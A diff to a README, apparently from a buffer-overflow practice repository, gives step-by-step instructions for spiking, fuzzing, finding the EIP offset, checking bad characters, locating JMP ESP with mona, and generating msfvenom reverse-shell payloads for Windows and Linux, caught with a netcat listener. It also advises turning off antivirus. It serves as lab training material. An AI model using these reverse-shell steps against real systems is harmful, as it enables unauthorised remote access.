@@ -45,21 +45,21 @@ Spiking is all about identifying what command is vulnerable (observed by the pro
 
 Steps:
 1. Connect to a port or a program that allows you to send specific commands, for instance; you may see that the system you're trying to exploit has a service on port 9999.
-Command: nc -nv 9999
+**Command: nc -nv 9999**
 2. Observe the commands that you can use on the service, in TheCyberMentor video, the vulnerable service command was "TRUN," but in reality, you will likely have to use the provided script on multiple commands until the program breaks.
 3. Run Immunity as Admin.
 4. Run the executable you found. (or downloaded for practice)
 5. Attach to the executable process.
 6. Click the "Play" button in Immunity, ensure it says Running on the bottom right-hand corner.
 7. Use the provided command.spk file, ensuring that you edit the 'STATS' command with whatever command you're attempting to test.
-Command: generic_send_tcp IP port command.spk 0 0
+**Command: generic_send_tcp IP port command.spk 0 0**
 8. After you utilize the command.spk, look to see if there's an Access Violation in Immunity, if there is not, edit the command within the command.spk to a different one and retest.
 
 # 3. Fuzzing
 The process of Fuzzing is to attempt to identify the number of bytes it took to crash the program.
 
 1. Edit the provided fuzz.py script. Replace the IP, PORT, and TRUN command with the IP, port, and command you want to test.
-Command: python fuzz.py
+**Command: python fuzz.py**
 2. Try to use CTRL+C to stop the script exactly when you see an Access Violation pop-up in Immunity. Doing so will ensure you can more accurately estimate the bytes it took to crash it.
 3. Write down the number of bytes it took to crash the program
 
@@ -67,16 +67,16 @@ Command: python fuzz.py
 The correct identification of the offset will help ensure that the Shellcode you generate will not immediately crash the program.
 
 1. Generate pattern code, replacing the number in the command with the number of bytes it took to crash the program (found in step 3)
-Command: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
+**Command: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000**
 2. Copy the output of the pattern_create command and edit the offset.py script provided in this repository. Replace the existing offset value portion of the script with the pattern that you generated from the command. Replace the IP, Port, and Command as you did in the previous testing sections.
 3. Closeout Immunity + the executable program.
 4. Repeat the process of relaunching Immunity and attaching to the executable program.
 5. Run the script
-Command: python offset.py
+**Command: python offset.py**
 6. Go into Immunity and look for a number written in the EIP space.
 7. If there is no number written into the EIP space, the number of bytes you identified in your Fuzz may be off. Go back to step 1 and regenerate pattern code, using a number higher than whatever you had written to the script. For instance, if you used 700, try 1000, or 1200. If you are unsuccessful, you may have messed up during Fuzzing. Go back to the Fuzzing section and try to stop the script faster when you see the Access Violation in Immunity.
 8. When you find a number written to the EIP, write this number down somewhere. Use the following command, replacing the -l switch value with your identified fuzz-bytes number from step 1, and replace the -q switch with the number that is written to the EIP.
-Command: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
+**Command: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337**
 9. If everything is correct, when you run the above command, you should get an exact offset match that looks like this:
  **[*] Exact match at offset 2003**
 10. Ensure that you write down this offset match.
@@ -86,7 +86,7 @@ This step will help you ensure that you can control the EIP. If you are successf
 1. Edit the provided python script to test your offset (shelling-out.py)
 2. Replace "2003" with your offset value found in step 9 of the Offset section, replace the IP, port, and command with your values as you did in previous sections.
 3. Run the script
-Command: python shelling-out.py
+**Command: python shelling-out.py**
 4. You should now observe 4 "B characters" represented by 42424242 written to the EIP.
 5. You now control the EIP.
 
@@ -97,7 +97,7 @@ The focus of this section is identifying bad characters so you can ensure they d
 3. Edit the provided badcharizard.py script, copy the Bad Characters section into a notepad, or somewhere that you can compare them against the Immunity Console. Ensure that you change the IP, Port, and Command within the script with your values.
 4. Relaunch Immunity and the executable, attaching to the program as you did in previous steps.
 5. Run the script
-Command: python badcharizard.py
+**Command: python badcharizard.py**
 6. Go to Immunity, right-click on the ESP value, and click on "Follow in Dump."
 7. Right-click on the Hex Dump tab and click "Appearance -> Font -> OEM" this will make the values a little bigger for comparison.
 8. In the Hex Dump, 01 represents the first bad character tested while FF represents the last. The bad characters go in order, compare the Hex Dump with the characters you copied into Notepad.
@@ -107,12 +107,12 @@ Command: python badcharizard.py
 # 7. Finding the Correct Module
 It's time to find what pointer you need to use to direct the program to your Shellcode for the Buffer Overflow
 1. Relaunch your Immunity and your program, reattach. This time, do not press the "play" button.
-2. Go into Immunity, and in the white space underneath the "terminals" type: !mona modules
+2. Go into Immunity, and in the white space underneath the "terminals" type: **!mona modules**
 3. You will see a bunch of information come up; you are concerned with the Module Info section. You are looking for a module that has all "False" values, preferably a dll, but it could be the actual exe you're attached to depending on the box you're attempting to exploit.
 4. Write down this module, for example, essfunc.dll
 5. You are now going to identify the JMP ESP, which is crucial because it represents the pointer value and will be essential for using your Shellcode.
 6. JMP ESP converted to hex is FFE4, that's what you're looking for.
-7. Return to that command box you used for mona modules, this time type: !mona find -s "\xff\xe4" -m essfunc.dll
+7. Return to that command box you used for mona modules, this time type: **!mona find -s "\xff\xe4" -m essfunc.dll**
 8. The -m switch represents the module that you're trying to find the JMP ESP for, ensure that you swap out essfunc.dll with whatever the module value you wrote down in step 4.
 9. When you use the command, you will get a column of results that look like this:
 0x625011af
@@ -130,7 +130,7 @@ It's time to find what pointer you need to use to direct the program to your She
 13. Click the pointer in the window in the top left-hand corner, click F2, you should see the value highlighted with a color. The objective is to set a break-point for testing.
 14. Now, you can click the "Play" button and observe "Running" in the bottom corner of Immunity.
 15. Run the python script
-Command: python jumpboyz.py
+**Command: python jumpboyz.py**
 16. If you see the pointer value written to the EIP, you can now generate Shellcode. If you don't see it, repeat the process with other column pointer values you identified as false from Step 9.
 
 # 8. Exploiting the System
@@ -142,9 +142,9 @@ Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.82 LPORT=4444 EXITFU
 4. Edit the included gotem.py script. Ensure that your exploitation IP and Port and command values are correct. Take your generated Shellcode and replace the overflow value that is currently in the script.
 5. Ensure that all variables are correct, including your exact byte value, pointer value, etc. 
 6. Start your netcat listener:
-Command: nc -lvp 4444
+**Command: nc -lvp 4444**
 7. Run the script:
-Command: python gotem.py
+**Command: python gotem.py**
 8. If the shell doesn't catch, try to change the padding value in the script from 32 to 16 or 8. It may take some trial and error.
 9. You should now have a shell, congratulations.
 
@@ -158,14 +158,14 @@ So you're a cool cat, huh? Going after Linux? That's fine! Let me share some min
 -You will have to generate Linux Shellcode.
 4. Once you have shelled your Windows system, it's time to make some quick changes to shell the Linux system.
 5. Generate Linux Shellcode:
-Command: msfvenom -p linux/x86/shell_reverse_tcp lhost=10.2.12.189 lport=4444 -f python -b '\x00'
+**Command: msfvenom -p linux/x86/shell_reverse_tcp lhost=10.2.12.189 lport=4444 -f python -b '\x00'**
 6. Replace the localhost with your Kali Machine and the bad characters that come after the -b switch
 7. Edit your gotem.py script, replace the IP and Port with the Linux Machine IP and port, and edit the command that you tested against with the vulnerable command.
 8. Delete the entire overflow section, paste the payload that you generate into this section.
 9. change the overflow variable in the shellcode, it should be **buf** instead
 10. Save the script! 
 11. Run the script:
-Command: python gotem.py
+**Command: python gotem.py**
 
 YOU ARE A MASTER
 
@@ -183,3 +183,6 @@ When you run this, you should be able to identify possible commands to test.
 -Are you using the correct exact offset match in the gotem.py script?
 -If you're testing against Windows, is Defender/AV turned off?
 -If you're launching the final exploit against Linux, did you change the Windows IP in the script to the Linux Machine?
+
+These are the only two questions i've thought of. Please contact me with any additional questions.
+Thank you for reading!
